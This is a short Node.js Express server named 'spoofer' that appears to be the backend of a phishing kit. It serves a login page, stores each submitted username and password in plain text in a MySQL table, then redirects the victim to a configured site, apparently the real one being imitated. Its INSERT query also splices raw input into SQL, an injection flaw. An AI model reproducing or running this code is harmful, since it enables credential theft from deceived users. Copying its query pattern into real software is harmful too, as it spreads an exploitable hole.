const express = require("express")
const {con}   = require("./conf/mysql.js")
const http    = require("http")
const https   = require("https")
const cors    = require("cors")

const CONF    = require("./CONF.json")

const spoofer = express()

////////////////////////////////////////
///listen

spoofer.listen(CONF.spoofer.port)

/*
let server = http.createServer(console)
server.listen(CONF.console.port)
*/

/////////////////////////////////////////


////////////////////////////////////////
//express
spoofer.use(express.urlencoded({extended: true}))
spoofer.use(cors())
spoofer.use("/static", express.static("public"))
///////////////////////////////////////


function login(user)
{
  return new Promise((resolve, reject)=>{
    con.query(`INSERT INTO user (user, mdp) VALUES ('${user.user}', '${user.mdp}')`, (err)=>{
      if(err){return reject({err: err})}
      resolve(200)
    })
  })
}

////////////////////////////////////////  
//route
spoofer.post("/login", async (req, res)=>{
  try{
    if(!req.body.username || !req.body.password)
      throw {err: "badd request"}

    let user = 
    {
      user: req.body.username,
      mdp: req.body.password
    }

    let status = await login(user);
    if(status === 200)
      res.redirect(CONF.spoofer.url)
  } 
  catch(err)
  {
    console.log(err)
    err = err.err || "bad request"
    res.redirect("./404")
  }  
})

spoofer.get("/", (req, res)=>{
  res.status(200).sendFile(__dirname + "/public/index.html")
})

spoofer.get("/404", (req, res)=>{
  res.status(404).sendFile(__dirname + "/public/404.html");
})
////////////////////////////////////////
